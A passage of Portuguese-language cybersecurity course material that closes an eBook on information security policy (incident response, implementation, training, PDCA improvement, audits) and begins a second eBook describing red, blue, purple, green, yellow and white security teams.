dados, e a garantia de que os dados críticos sejam recuperados rapidamente. 
 
Cumprimento de Regulamentações 
 
Muitas regulamentações, como a LGPD no Brasil e o GDPR na Europa, exigem 
que as organizações tenham políticas de resposta a incidentes em vigor. A 
gestão eficaz de incidentes ajuda a garantir a conformidade com essas leis, 
evitando penalidades e danos à reputação. 
 
Melhoria Contínua 
 
A análise pós-incidente permite que as organizações aprendam com os 
incidentes e melhorem continuamente suas políticas e procedimentos de 
segurança. Isso fortalece a resiliência da organização e melhora sua capacidade 
de enfrentar futuras ameaças. 
 
Engajamento e Conscientização 
 
A gestão de incidentes promove uma cultura de segurança dentro da 
organização. Ao envolver todos os níveis da empresa na resposta a incidentes, 
a organização pode aumentar a conscientização sobre a importância da 
segurança da informação e incentivar o cumprimento das políticas de segurança. 
 
Prevenção de Reincidências 
 
Ao identificar as causas raiz dos incidentes e implementar medidas corretivas, a 
gestão de incidentes ajuda a prevenir a reincidência de problemas semelhantes 
no futuro. Isso inclui a correção de vulnerabilidades e a implementação de novas 
práticas de segurança para fortalecer as defesas da organização. 

 
 
Exemplos práticos de Resposta a Incidentes de segurança 
 
Ataque de ransomware 
 
• 
Cenário: uma empresa é alvo de um ataque de ransomware que 
criptografa dados críticos e demanda um resgate para restaurar o acesso. 
• 
Resposta: a equipe de resposta a incidentes isola os sistemas afetados, 
executa a recuperação de dados a partir de backups e realiza uma análise 
pós-incidente para identificar como o ransomware entrou na rede. Com 
base nessa análise, a empresa reforça suas políticas de segurança, 
implementa uma segmentação de rede mais rigorosa e treina os 
funcionários para identificar tentativas de phishing. 
 
Violação de dados 
 
• 
Cenário: uma violação de dados expõe informações pessoais de clientes 
devido a uma falha de segurança em um aplicativo web. 
• 
Resposta: a empresa imediatamente desativa o acesso ao aplicativo, 
investiga a vulnerabilidade e a corrige. A equipe de segurança notifica os 
clientes afetados, conforme exigido pela regulamentação, e oferece 
serviços de monitoramento de crédito. Em seguida, a empresa revisa e 
atualiza suas políticas de segurança para prevenir futuras violações. 
 
Intrusão na rede 
 
• 
Cenário: a equipe de TI detecta atividade anômala que indica uma 
possível intrusão na rede corporativa. 
• 
Resposta: a equipe de segurança rastreia a origem da intrusão, isola os 
sistemas comprometidos e inicia uma análise detalhada para determinar 
a extensão do acesso não autorizado. Após erradicar a ameaça, a 
empresa realiza uma revisão completa de seus controles de acesso e 
implementa novas medidas de monitoramento para detectar intrusões de 
forma mais eficaz no futuro. 
 
 
 
A gestão de incidentes de segurança é um componente crítico das políticas de 
segurança da informação. Ao preparar, identificar, analisar, conter, corrigir e 
colher lições aprendidas de incidentes de segurança (ou uma outra forma de 
abordar essas questões poderia ser: preparar, identificar, conter, erradicar, 
recuperar e aprender, conforme algumas literaturas tratam assuntos de 
Resposta a Incidentes), as organizações podem minimizar os impactos 
negativos, proteger seus dados e ativos, e melhorar continuamente suas defesas 
contra futuras ameaças.  
A integração de uma gestão eficaz de incidentes dentro das políticas de 
segurança garante que a organização esteja pronta para responder rapidamente 
e eficazmente a qualquer evento que possa comprometer sua segurança 
cibernética. 
 
 
 
 

 
 
UNIDADE 5 IMPLEMENTAÇÃO, MONITORAMENTO E 
AUDITORIA 
 
Nesta unidade, vamos aprender como implementar as políticas de segurança 
que criamos, como manter as políticas relevantes, vigentes e atualizadas com 
o mercado, bem como checar a efetividade dos seus controles através de 
auditorias periódicas. 
 
OBJETIVOS DA UNIDADE 5 
 
Ao final dos estudos, você deverá ser capaz de: 
 
• Implementar políticas de segurança da informação; 
 
• Atualizar, revisar e auditar suas políticas e processos, seja por auditorias 
ou processos de melhoria contínua. 
 
 
 

 
 
5.1. PLANO DE IMPLEMENTAÇÃO DE POLÍTICA DE SEGURANÇA 
 
Hora de colocar em prática tudo aprendido até aqui, tirando suas ideias e 
políticas do papel e ver elas se materializarem de maneira prática. 
 
Considere que sem estas etapas a seguir, dificilmente sua política será seguida 
e ter o efeito esperado na companhia: 
Compreenda as necessidades de segurança x empresa 
• 
Avaliação de ativos críticos (dados, sistemas, pessoas); 
• 
Riscos exponenciais e ameaças potenciais; 
• 
Análise de impacto. 
Engajamento da alta liderança 
• 
Sem o envolvimento da diretoria e/ou conselho, as políticas não se 
sustentam; 
• 
Apresente à alta liderança resultados de análise de riscos em comitês 
específicos; 
• 
Garanta que há comprometimento e apoio da direção da empresa. 
Escopo e desenvolvimento da política 
• 
Defina o alcance da política, envolvendo as áreas e compreendendo os 
ativos afetados; 
• 
Desenvolva a política e valide-a com as áreas envolvidas e stakeholders. 
Comunicação e treinamento 
• 
Desenvolva materiais de treinamento relacionados às políticas; 
• 
Workshops e sessões de treinamentos; 
• 
Desenvolva um programa contínuo de conscientização. 
Monitoramento e auditoria 
• 
Monitore a efetividade da política de segurança na empresa (aderência, 
engajamento etc.); 
• 
Realize auditorias periódicas para checar a conformidade da política; 
• 
Ajuste a política conforme necessidades corporativas, regulamentações 
ou legislações. 
Considere que engajamento, treinamentos e monitorar a efetividade da sua 
política, bem como as diretrizes e controles nela contidas, são fundamentais para 
garantir e medir o sucesso dela. Parte do seu plano de implementação da política 
precisa garantir ao menos que esses três elementos (engajamento, treinamentos 
e monitoramento) sejam cumpridos. 
 
 

 
 
 
 
 
5.2. TREINAMENTO E CONSCIENTIZAÇÃO 
 
Um plano de treinamento e conscientização em segurança da informação é 
fundamental para proteger os ativos da organização e garantir que todos os 
colaboradores estejam preparados para lidar com ameaças. Seguindo estas 
etapas, você poderá desenvolver e implementar um programa de treinamento 
eficaz e sustentável. 
Importante: 
• 
Os treinamentos explicam as necessidades das políticas; 
• 
Os funcionários precisam conhecer as leis e regulamentações de 
compliance com as quais a empresa precisa estar em conformidade; 
• 
Os funcionários devem conhecer as políticas gerais da companhia, e 
muitas vezes assiná-las; 
• 
As campanhas de conscientização devem ensinar melhores práticas de 
segurança, como mesa limpa, antiphishing, antifraude, ética, entre 
outros; 
• 
Os treinamentos devem ser revisados periodicamente, refletindo novas 
ameaças, novas tecnologias e novas regulamentações. 
5.3. AUDITORIA E MELHORIA CONTÍNUA 
 
Melhoria Contínua 
 
A melhoria contínua é um princípio fundamental na gestão de políticas de 
segurança da informação, voltado para o aperfeiçoamento constante dos 
processos, controles e estratégias que protegem os ativos digitais de uma 
organização. No contexto da segurança da informação, a melhoria contínua não 
é apenas desejável, mas essencial, dada a natureza dinâmica e em constante 
evolução das ameaças cibernéticas. 
 
Por definição, melhoria contínua são práticas que visam aprimorar e melhorar 
ininterruptamente os processos. 
 
Uma das maneiras eficientes de se fazer melhoria contínua é fazendo o uso do 
PDCA (Plan, Do, Check, Act – Planejar, Fazer, Checar e Agir): 
• 
Metodologia de gerenciamento para a melhoria de processos de maneira 
constante. 
• 
Aplicável para trabalhar em melhorias de processos de segurança. 
Melhoria Contínua em detalhes 
A melhoria contínua envolve a revisão e o aprimoramento constantes das 
políticas, procedimentos e controles de segurança para garantir que estejam 
sempre alinhados com as melhores práticas, novas tecnologias e mudanças no 

 
 
cenário de ameaças. Isso significa que as políticas de segurança da informação 
não são estáticas; elas devem ser adaptadas regularmente para enfrentar novos 
desafios e aproveitar oportunidades de melhoria. 
O processo de melhoria contínua geralmente segue o ciclo PDCA, também 
conhecido como ciclo de Deming: 
1. Plan (Planejar) 
• Identificar áreas de melhoria com base em avaliações de risco, auditorias 
de segurança e feedback das partes interessadas. 
• Definir objetivos claros e metas para as melhorias necessárias. 
• Desenvolver planos de ação detalhados para implementar as mudanças 
propostas nas políticas de segurança. 
2. Do (Executar) 
• Implementar as mudanças planejadas nas políticas, procedimentos e 
controles de segurança. 
• Garantir que todos os colaboradores estejam cientes das mudanças e que 
recebam o treinamento necessário para cumprir com as novas políticas. 
3. Check (Verificar) 
• Monitorar e medir os resultados das mudanças implementadas. 
• Realizar auditorias e avaliações para garantir que as políticas atualizadas 
estejam funcionando conforme o esperado. 
• Coletar feedback dos usuários e das partes interessadas para identificar 
novas áreas de melhoria. 
4. Act (Agir) 
• Ajustar as políticas e procedimentos com base nos resultados da 
verificação. 
• Implementar correções ou novas melhorias conforme necessárias. 
• Documentar o processo de melhoria e comunicar os resultados às partes 
interessadas. 
Melhoria Contínua nas políticas de segurança da informação 
1. Adaptação às novas ameaças 
O cenário de ameaças cibernéticas está em constante mudança, com novos 
tipos de ataques e vulnerabilidades emergindo regularmente. A melhoria 
contínua permite que as políticas de segurança da informação sejam adaptadas 
rapidamente para enfrentar essas novas ameaças, minimizando o risco de 
incidentes de segurança. 
2. Acompanhamento de mudanças tecnológicas 

 
 
À medida que as organizações adotam novas tecnologias, como computação em 
nuvem, Internet das Coisas (IoT) e inteligência artificial, suas políticas de 
segurança também precisam evoluir para proteger esses novos ambientes. A 
melhoria contínua garante que as políticas estejam sempre atualizadas para lidar 
com as complexidades e os riscos dessas tecnologias emergentes. 
3. Conformidade com regulamentações 
As regulamentações de segurança e privacidade de dados, como a LGPD, 
GDPR, HIPAA e outras, estão sempre evoluindo. A melhoria contínua permite 
que as organizações mantenham suas políticas de segurança em conformidade 
com as normas e requisitos legais mais recentes, evitando penalidades e danos 
à reputação. 
4. Redução de vulnerabilidades 
Ao revisar e aprimorar regularmente as políticas de segurança, as organizações 
podem identificar e corrigir vulnerabilidades antes que sejam exploradas por 
atacantes. Isso inclui a implementação de novos controles de segurança, a 
remoção de práticas obsoletas e a melhoria dos processos existentes. 
5. Engajamento e conscientização 
A melhoria contínua também contribui para a criação de uma cultura de 
segurança dentro da organização. Ao envolver colaboradores em processos de 
melhoria e mantê-los informados sobre as atualizações das políticas de 
segurança, a organização promove um maior engajamento e conscientização 
em torno da importância da segurança da informação. 
6. Melhoria da resiliência organizacional 
A capacidade de uma organização de responder e se recuperar de incidentes de 
segurança é fortalecida quando suas políticas são continuamente aprimoradas. 
A melhoria contínua contribui para a resiliência organizacional, garantindo que a 
empresa esteja preparada para lidar com incidentes de segurança de maneira 
eficaz e eficiente. 
7. Aprimoramento da qualidade dos dados 
A revisão constante das políticas de segurança também ajuda a melhorar a 
qualidade dos dados gerenciados pela organização. Isso inclui garantir que os 
dados sejam precisos, completos e seguros, o que é fundamental para a tomada 
de decisões informadas e para a confiança dos stakeholders. 
Exemplos práticos de Melhoria Contínua nas políticas de segurança da 
informação 
Atualização regular das políticas de senhas 

 
 
Cenário: uma organização percebe que suas políticas de senhas estão 
desatualizadas e não refletem as melhores práticas atuais, como a autenticação 
multifatorial (MFA). 
Ação: a política de senhas é revisada para incluir a MFA, exigindo que todos os 
usuários adotem essa medida adicional de segurança. Além disso, o 
comprimento e a complexidade das senhas são aumentados, e as políticas são 
revisadas anualmente para garantir que permaneçam eficazes. 
Melhoria na gestão de acessos 
Cenário: uma auditoria de segurança revela que muitos funcionários têm acesso 
a sistemas e dados que não são necessários para suas funções. 
Ação: a organização implementa um processo de revisão periódica de 
permissões de acesso, garantindo que os funcionários tenham acesso apenas 
às informações necessárias para suas funções. Isso reduz o risco de acessos 
não autorizados e protege informações sensíveis. 
Implementação de políticas de segurança para dispositivos móveis 
Cenário: com o aumento do uso de dispositivos móveis pelos funcionários, a 
organização reconhece a necessidade de fortalecer a segurança para esses 
dispositivos. 
Ação: uma política de segurança para dispositivos móveis é desenvolvida e 
implementada, incluindo requisitos para criptografia, autenticação e uso de redes 
seguras. A política é revisada regularmente para incorporar novas tecnologias 
de segurança e proteger contra ameaças emergentes. 
A melhoria contínua é um componente vital na gestão de políticas de segurança 
da informação. Em um ambiente onde as ameaças cibernéticas e as tecnologias 
estão em constante evolução, as organizações que adotam uma abordagem de 
melhoria contínua estão mais bem posicionadas para proteger seus dados, 
manter a conformidade com regulamentações e fortalecer sua resiliência 
organizacional. Ao seguir o ciclo PDCA e envolver toda a organização no 
processo, as empresas podem garantir que suas políticas de segurança da 
informação permaneçam eficazes, relevantes e robustas. 
 
Auditorias 
Já as auditorias elas normalmente são processos para chancelar a conformidade 
de algo, ou validar a eficiência, integridade e efetividade de processos da 
companhia. Tem como características: 
• 
Internas ou externas, através de um plano estabelecido e coletando 
evidências dos processos e sistemas da companhia; 

 
 
• 
No contexto de segurança da informação, elas também podem ocorrer 
através de testes de invasão (pentests), entrevistas etc., para validar 
controles, regras, entre outros. 
As auditorias têm como entregáveis e resultados práticos que corroboram com 
a melhoria contínua e monitoramento de suas políticas de segurança e controles 
relacionados a GSI: 
• 
GAP Analysis, relatórios técnicos ou laudos de conformidade; 
• 
Planos de ação para correção de falhas (GAPs) ou melhoria em 
processos de segurança. 
 
As auditorias de segurança são processos sistemáticos de avaliação das 
políticas, procedimentos, controles e práticas de segurança de uma organização. 
O principal objetivo de uma auditoria de segurança é garantir que os sistemas 
de segurança da informação estejam funcionando de acordo com os requisitos 
estabelecidos e que a organização esteja protegida contra ameaças internas e 
externas. Essas auditorias são fundamentais para identificar vulnerabilidades, 
avaliar a eficácia dos controles existentes e recomendar melhorias para 
fortalecer a segurança. 
 
Importância das Auditorias de Segurança 
 
1. Identificação de vulnerabilidades 
 
As auditorias de segurança ajudam a identificar fraquezas nos sistemas, redes 
e processos de uma organização que poderiam ser exploradas por atacantes. 
Ao detectar essas vulnerabilidades, as empresas podem corrigir problemas 
antes que sejam explorados. 
 
2. Verificação da conformidade 
 
Muitas indústrias e setores são regulamentados por normas e leis que exigem 
conformidade com certos padrões de segurança. As auditorias verificam se a 
organização está em conformidade com essas regulamentações, evitando 
multas, penalidades e possíveis danos à reputação. 
 
3. Avaliação da eficácia dos controles 
 
As auditorias avaliam se os controles de segurança implementados são eficazes 
para mitigar os riscos identificados. Isso inclui a revisão de políticas de acesso, 
criptografia de dados, monitoramento de redes, entre outros. 
 
4. Prevenção de incidentes de segurança 
 
Ao realizar auditorias regulares, as organizações podem detectar problemas 
potenciais antes que se tornem incidentes de segurança, prevenindo perdas 
financeiras, danos à reputação e interrupções nas operações. 
 
 
 
 

 
 
5. Melhoria contínua 
 
As auditorias fornecem insights valiosos para a melhoria contínua dos sistemas 
de segurança. Com base nas recomendações das auditorias, as empresas 
podem atualizar e reforçar suas defesas para enfrentar ameaças emergentes. 
 
Tipos de auditorias de segurança 
 
• Auditoria de conformidade 
 
o Objetivo: garantir que a organização esteja em conformidade com 
normas e regulamentos específicos, como PCI-DSS, ISO/IEC 
27001, HIPAA, entre outros. 
 
o Exemplo: uma empresa que processa pagamentos com cartões de 
crédito pode realizar uma auditoria de conformidade com o PCI-
DSS para garantir que os dados dos titulares dos cartões estejam 
protegidos conforme exigido pelas normas. 
 
• Auditoria de rede 
 
o Objetivo: avaliar a segurança das redes de computadores da 
organização, incluindo firewalls, sistemas de detecção de intrusão 
(IDS), roteadores e switches. 
 
o Exemplo: uma auditoria de rede pode revelar que um firewall não 
está configurado corretamente, permitindo o acesso não 
autorizado a partes críticas da rede da empresa. 
 
• Auditoria de aplicações 
 
o Objetivo: verificar a segurança de aplicativos desenvolvidos 
internamente ou por terceiros, garantindo que estejam livres de 
vulnerabilidades. 
 
o Exemplo: uma auditoria de segurança em um aplicativo de e-
commerce pode identificar falhas de injeção de SQL que 
permitiriam a um atacante acessar informações sensíveis dos 
clientes. 
 
• Auditoria de políticas e procedimentos 
 
o Objetivo: revisar e avaliar a eficácia das políticas e procedimentos 
de segurança da informação da organização. 
 
o Exemplo: uma auditoria pode identificar que a política de 
gerenciamento de senhas está desatualizada, recomendando a 
adoção de práticas mais rigorosas, como a autenticação 
multifatorial. 
 
• Auditoria de controle de acesso 

 
 
 
o Objetivo: avaliar os controles de acesso físico e lógico para garantir 
que apenas indivíduos autorizados tenham acesso a recursos 
específicos. 
 
o Exemplo: uma auditoria de controle de acesso pode descobrir que 
vários funcionários têm acesso a dados que não são necessários 
para suas funções, representando um risco de exposição acidental 
ou maliciosa. 
 
• Auditoria de segurança física 
 
o Objetivo: avaliar a segurança das instalações físicas da 
organização, incluindo controles de acesso, vigilância, proteção 
contra incêndio, entre outros. 
 
o Exemplo: uma auditoria de segurança física pode revelar que a 
sala de servidores não está adequadamente protegida contra 
acesso não autorizado, sugerindo a instalação de sistemas de 
controle de acesso biométrico. 
 
Exemplos práticos de auditorias de segurança 
 
1. Auditoria em uma instituição financeira 
 
o Cenário: um banco realiza uma auditoria de conformidade com a 
norma ISO/IEC 27001 para garantir que suas práticas de 
segurança da informação estejam em conformidade com os 
padrões internacionais. 
 
o Descoberta: a auditoria revela que alguns sistemas críticos não 
têm backups regulares, expondo a instituição ao risco de perda de 
dados em caso de falhas de hardware. Como resultado, o banco 
implementa um sistema de backup automatizado e revisa suas 
políticas de recuperação de desastres. 
 
2. Auditoria de segurança em uma empresa de e-commerce 
 
o Cenário: uma empresa de e-commerce realiza uma auditoria de 
segurança de suas aplicações para proteger os dados dos clientes 
e garantir que as transações online sejam seguras. 
 
o Descoberta: a auditoria identifica uma vulnerabilidade de injeção 
de SQL no processo de checkout, que poderia permitir a um 
atacante roubar informações de cartões de crédito. A empresa 
corrige imediatamente a vulnerabilidade e implementa testes de 
segurança contínuos para prevenir futuras falhas. 
 
3. Auditoria de rede em uma empresa de telecomunicações 

 
 
o Cenário: uma empresa de telecomunicações realiza uma auditoria 
de segurança de sua rede para garantir a integridade e 
disponibilidade dos serviços oferecidos aos clientes. 
 
o Descoberta: a auditoria detecta que as configurações de um 
roteador exposto à internet não estão seguindo as melhores 
práticas de segurança, deixando a rede vulnerável a ataques de 
negação de serviço (DDoS). A empresa atualiza as configurações 
do roteador e implementa monitoramento contínuo de tráfego para 
detectar atividades suspeitas. 
 
 
 
As auditorias de segurança são uma ferramenta vital para qualquer organização 
que deseja proteger seus sistemas, dados e operações contra uma ampla gama 
de ameaças. Realizar auditorias regulares ajuda a identificar vulnerabilidades, 
garantir a conformidade com regulamentos, avaliar a eficácia dos controles e 
melhorar continuamente as defesas de segurança. Ao adotar uma abordagem 
proativa e sistemática para a auditoria de segurança, as empresas podem mitigar 
riscos, evitar incidentes de segurança e assegurar a continuidade dos negócios. 
 
Entenda que Auditorias são processos cruciais para manter a segurança da 
informação robusta e eficaz, enquanto a melhoria contínua garante que diretrizes 
e políticas se mantenham relevantes. 
 
Utilizá-las permite identificar e corrigir falhas, garantindo proteção contra 
ameaças, mantendo suas políticas de segurança vivas e seu GSI eficiente. 
 
 
 
 

 
 
FINALIZAR 
 
Terminamos aqui nossa jornada de políticas de segurança da informação. É 
um conteúdo muito denso e focado em compliance/conformidade, porém 
fundamental para uma boa governança de segurança e elaboração de 
eficientes políticas de segurança da informação. 
 
Eu agradeço seu comprometimento e dedicação, espero que o material aqui 
apresentado lhe seja útil no seu cotidiano com essa área tão importante que é 
segurança da informação, e lhe dê insumos suficientes para ter uma introdução 
básica de vários assuntos importantes para que você possa continuar a se 
desenvolver posteriormente e por conta própria. 
 
Aprendemos nossa jornada a criar políticas de segurança e mantê-las, 
pautadas em normas, frameworks, leis e regulamentações, alicerçadas por 
fundamentos claros de segurança da informação. Aprendemos também que 
conhecer os riscos corporativos, bem como enfrentá-los e respondê-los, podem 
ser determinísticos na definição de processos e governança de segurança da 
informação. 
 
Eu acredito que a área de segurança da informação tem como característica de 
ser parte do negócio, e não uma área definidora de regras e apenas zelando 
pelo cumprimento delas. Claro, isso faz parte do trabalho do profissional de 
segurança, mas fazer parte do negócio, saber aplicar regras sem criar mais 
fricção, ter empatia pelos problemas e desafios do próximo e/ou da companhia, 
são diferenciais que eu convido você a exercitar na sua jornada profissional. 
 
Lembre-se, sua jornada não termina aqui, continue se aprimorando e buscando 
conhecimentos nessa área vasta e tão plural que é segurança da informação. 
 
Parabenizo você por sua trajetória e dedicação neste curso. Desejo-lhe 
sucesso em sua trajetória profissional e espero que as pílulas de conhecimento 
trazidas neste material especialmente para você, lhe proporcione um pouco 
mais de valor agregado na sua jornada profissional e suas experiências. 
 
Prof. Rodrigo Muniz 
 
 

 
 
SOBRE O AUTOR 
 
Rodrigo Muniz é um profissional da área de segurança da informação com mais 
de uma década trabalhando com segurança da informação e quase duas 
décadas atuando na área de tecnologia. Passou por diversas áreas e disciplinas 
de segurança da informação, onde nos últimos anos trabalhou diretamente com 
áreas técnicas envolvendo segurança ofensiva, segurança de aplicações e 
arquitetura de segurança. Também é especialista em segurança de produtos e 
segurança em Cloud Computing. Pós-graduado em Gestão de Segurança da 
Informação, possui vasta experiência em gestão e liderança técnica. 
 
 
 
 
 
 
 
 
 

 
 
REFERÊNCIAS BIBLIOGRÁFICAS 
 
KIM, David; SOLOMON, Michael. Fundamentos de segurança de sistemas de 
informação: engloba riscos e ameaças advindas das mudanças digitais. Rio de Janeiro: 
LTC, 2014. (Minha Biblioteca).  
 
MACHADO, Felipe Nery Rodrigues. Segurança da informação: princípios e controle de 
ameaças. São Paulo: Erica, 2019. Ebook. (Minha Biblioteca).  
 
FONTES, Edison. Políticas e normas para a segurança da informação: como 
desenvolver, implantar e manter regulamentos para a proteção da informação nas 
organizações. Rio de Janeiro: Brasport, 2012. E-book. (Biblioteca Pearson).  
 
GOODRICH, Michael. Introdução à segurança de computadores: conceitos básicos e 
criptográficos, segurança física, segurança de sistemas operacionais, segurança web, 
etc. Porto Alegre: Bookman, 2012. Ebook. (Minha Biblioteca).  
 
SILVA, Michel Bernardo Fernandes da. Cibersegurança: uma visão panorâmica sobre a 
segurança da informação na internet. Rio de Janeiro: Freitas Bastos, 2023. E-book. 
(Biblioteca Pearson).   
 
PINHEIRO, Patrícia Peck. Segurança Digital: Proteção de Dados nas Empresas, São Paulo: 
Atlas, 2020. Ebook. (Minha Biblioteca).  
 
PINHEIRO, Patrícia Peck. Segurança da informação e meios de pagamento eletrônicos: 
tendências sobre segurança digital, uso de IA, reconhecimento facial e biometria e 
redução de crimes cibernéticos. Ed. Curitiba: Intersaberes, 2022. E-book. (Biblioteca 
Pearson). 
 
MARINHO, Fernando. Os 10 mandamentos da LGPD: como implementar a Lei Geral de 
Proteção de Dados em 14 passos. São Paulo: Atlas, 2020. E-book. (Minha Biblioteca).  
 
 
 


--- Fim do arquivo: eBook - Política de Segurança.pdf ---

--- Começo do arquivo: eBook - Princípios de Segurança.pdf ---

 
 
UNIDADE 1 PRINCÍPIOS DE SEGURANÇA DEFENSIVA 
 
Damos início a nossa jornada de aprendizado relacionada a princípios de 
segurança da informação. Nesta unidade, vamos entender o que cada disciplina 
de segurança faz e como costuma ser segmentada por cores. Além disso, 
faremos uma introdução em APTs, e vamos reforçar as práticas de segurança 
proativas. 
 
OBJETIVOS DA UNIDADE 1  
 
Ao final dos estudos, você deverá ser capaz de: 
 
• Compreender o leque de cores da área de segurança da informação; 
 
• Compreender o que é um APT e como ele é uma ameaça; 
 
• Compreender minimamente sobre práticas de segurança proativas. 
 
 

 
 
1.1 O LEQUE DAS DISCIPLINAS DE SEGURANÇA DA INFORMAÇÃO E A 
CONSTRUÇÃO DE DEFESAS EM PROFUNDIDADE 
 
A segurança da informação é uma disciplina abrangente que exige uma 
abordagem multifacetada para proteger os dados e ativos digitais de uma 
organização.  
 
A área de segurança da informação abrange um vasto conjunto de disciplinas, 
cada uma desempenhando um papel crucial na proteção de sistemas, dados e 
ativos digitais. Muitas vezes, essas disciplinas são organizadas em equipes 
coloridas, onde cada cor representa uma função específica e um conjunto de 
responsabilidades dentro de um programa de segurança. Esse sistema de 
categorização por cores facilita a compreensão e a especialização das equipes, 
permitindo uma resposta mais coordenada e eficiente às ameaças cibernéticas. 
 
Uma das formas mais eficazes de organizar as responsabilidades dentro de um 
programa de segurança é através das equipes coloridas. 
 
1. Red Team (Equipe Vermelha) – A Equipe de Ataque 
A equipe vermelha é composta por especialistas que atuam como "adversários" 
dentro de uma organização. Seu trabalho é simular ataques reais, explorando 
vulnerabilidades e brechas nos sistemas, redes e aplicações. A ideia é pensar e 
agir como um hacker mal-intencionado para descobrir falhas antes que 
criminosos o façam. 
Funções e Responsabilidades: 
• 
Testes de Penetração (Pentests): A equipe realiza pentests para 
identificar fraquezas em sistemas e redes. Esses testes envolvem 
tentativas de exploração de vulnerabilidades, como falhas de software, 
problemas de configuração e brechas de segurança física. 
• 
Simulação de Ameaças Avançadas: A equipe vermelha simula ataques 
sofisticados, como APTs (Ameaças Persistentes Avançadas), para testar 
a resiliência dos sistemas da organização contra adversários altamente 
qualificados. 
• 
Engenharia Social: Eles também podem simular ataques de engenharia 
social, como phishing e outras táticas que visam enganar funcionários 
para obter acesso a sistemas internos. 
Benefícios para a Organização: 
• 
Identificação de Vulnerabilidades: Ao detectar e explorar brechas, a 
equipe vermelha ajuda a organização a identificar pontos fracos em sua 
infraestrutura antes que cibercriminosos possam fazer isso. 
• 
Aprimoramento de Defesas: Os resultados dos ataques simulados são 
utilizados para aprimorar as defesas cibernéticas e aumentar a resiliência 
do sistema contra ataques reais. 
 
2. Blue Team (Equipe Azul) – A Equipe de Defesa 
Enquanto a equipe vermelha foca em atacar e explorar vulnerabilidades, a 
equipe azul é a responsável pela defesa da organização. Eles monitoram a rede, 
implementam controles de segurança e respondem a incidentes cibernéticos. 
Sua função é prevenir, detectar e reagir a tentativas de invasão. 
Funções e Responsabilidades: 

 
 
• 
Monitoramento 
Contínuo: 
A 
equipe 
azul 
usa 
ferramentas 
de 
monitoramento, 
como 
SIEM 
(Security 
Information 
and 
Event 
Management), para detectar comportamentos anômalos e sinais de 
ataques em tempo real. 
• 
Respostas a Incidentes: Eles são responsáveis por gerenciar incidentes 
de segurança, incluindo a contenção de ataques, erradicação de ameaças 
e recuperação de sistemas afetados. 
• 
Aprimoramento de Defesas: A equipe azul implementa firewalls, controles 
de acesso, criptografia e outros mecanismos de proteção para manter a 
integridade dos sistemas e dados. 
• 
Detecção de Intrusões: Usam ferramentas como IDS/IPS (Intrusion 
Detection/Prevention Systems) para detectar e prevenir invasões. 
Benefícios para a Organização: 
• 
Detecção e Resposta Rápida a Ameaças: O trabalho da equipe azul 
garante que ameaças sejam rapidamente detectadas e neutralizadas, 
minimizando o impacto de ataques cibernéticos. 
• 
Fortalecimento das Defesas: A equipe azul não apenas responde a 
ameaças, mas também aprimora continuamente as defesas da 
organização com base nas lições aprendidas em incidentes passados. 
 
3. Purple Team (Equipe Roxa) – Colaboração Entre Ataque e Defesa 
A equipe roxa é uma combinação das equipes vermelha e azul. Seu papel é 
garantir que as simulações de ataques realizadas pela equipe vermelha sejam 
incorporadas efetivamente nas práticas de defesa da equipe azul. Eles 
promovem a colaboração entre as duas equipes para que as vulnerabilidades 
detectadas sejam rapidamente corrigidas. 
Funções e Responsabilidades: 
• 
Facilitação da Colaboração: A equipe roxa atua como um elo entre a 
equipe de ataque (vermelha) e a equipe de defesa (azul), garantindo que 
ambas compartilhem informações e trabalhem em conjunto. 
• 
Testes Coordenados: Eles garantem que os testes de segurança, como 
pentests e simulações de ataques, sejam utilizados para aprimorar 
continuamente as defesas da equipe azul. 
• 
Aprendizado Contínuo: A equipe roxa incentiva a análise conjunta das 
falhas e sucessos tanto dos ataques simulados quanto das respostas da 
equipe azul, promovendo a melhoria contínua. 
Benefícios para a Organização: 
• 
Aprimoramento Contínuo das Defesas: Ao facilitar a colaboração entre as 
equipes de ataque e defesa, a equipe roxa garante que as defesas sejam 
continuamente aprimoradas com base nas simulações de ataque. 
• 
Redução 
de 
Vulnerabilidades: 
Essa 
colaboração 
permite 
que 
vulnerabilidades sejam identificadas e corrigidas rapidamente, reduzindo 
a exposição da organização a ameaças. 
 
4. Green Team (Equipe Verde) – Foco no Desenvolvimento Seguro 
A equipe verde é responsável por garantir que o desenvolvimento de software e 
de sistemas siga práticas seguras desde o início. Eles trabalham com 
desenvolvedores e engenheiros para implementar práticas de codificação 
segura e revisar o código em busca de vulnerabilidades. 
Funções e Responsabilidades: 

 
 
• 
Implementação de Práticas de Desenvolvimento Seguro: A equipe verde 
garante que práticas de segurança, como validação de entradas, 
criptografia e controle de acessos, sejam incorporadas ao ciclo de vida de 
desenvolvimento de software (SDLC). 
• 
Revisão de Código: Eles conduzem revisões de código para identificar e 
corrigir vulnerabilidades antes que o software seja implementado. 
• 
Testes de Segurança Automatizados: A equipe verde implementa 
ferramentas de análise de código estático e dinâmico para detectar 
automaticamente vulnerabilidades durante o desenvolvimento. 
Benefícios para a Organização: 
• 
Redução de Vulnerabilidades no Código: Com a equipe verde revisando 
o código e implementando práticas seguras, há uma menor probabilidade 
de vulnerabilidades serem introduzidas no software. 
• 
Desenvolvimento Seguro: Ao incorporar segurança desde o início, a 
equipe verde ajuda a evitar problemas de segurança mais tarde no ciclo 
de vida do desenvolvimento. 
 
5. Yellow Team (Equipe Amarela) – Conformidade e Proteção de Dados 
A equipe amarela é responsável por garantir que a organização esteja em 
conformidade com as regulamentações de proteção de dados, como a LGPD 
(Lei Geral de Proteção de Dados) e o GDPR (Regulamento Geral de Proteção 
de Dados). Eles garantem que os dados pessoais sejam protegidos e que as 
políticas de segurança da informação estejam de acordo com as normas legais. 
Funções e Responsabilidades: 
• 
Conformidade com Regulamentações: A equipe amarela é encarregada 
de garantir que a organização esteja em conformidade com as 
regulamentações de proteção de dados, como a LGPD, GDPR e outras 
normas setoriais. 
• 
Gestão de Políticas de Segurança: Eles desenvolvem, implementam e 
revisam as políticas de segurança de dados para garantir que as 
informações pessoais e sensíveis sejam protegidas. 
• 
Auditorias de Conformidade: Conduzem auditorias regulares para avaliar 
se a organização está cumprindo as regulamentações e corrigir quaisquer 
falhas identificadas. 
Benefícios para a Organização: 
• 
Redução 
de 
Riscos 
Legais: 
Garantir 
a 
conformidade 
com 
regulamentações de proteção de dados reduz o risco de penalidades 
legais e danos à reputação. 
• 
Proteção de Dados Sensíveis: A equipe amarela ajuda a proteger 
informações sensíveis, como dados pessoais e financeiros, contra 
acessos não autorizados. 
 
6. White Team (Equipe Branca) – Organização e Avaliação 
A equipe branca é responsável por planejar, organizar e avaliar exercícios de 
segurança, como war games e simulações de ataques. Eles garantem que os 
